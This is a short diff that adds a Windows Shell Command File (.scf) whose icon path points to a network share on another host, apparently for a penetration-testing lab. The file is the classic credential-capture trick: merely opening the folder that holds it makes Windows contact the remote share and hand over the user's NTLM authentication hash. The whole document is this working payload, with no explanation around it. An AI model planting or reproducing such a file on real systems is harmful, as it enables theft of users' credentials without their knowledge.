@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\10.0.0.5\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
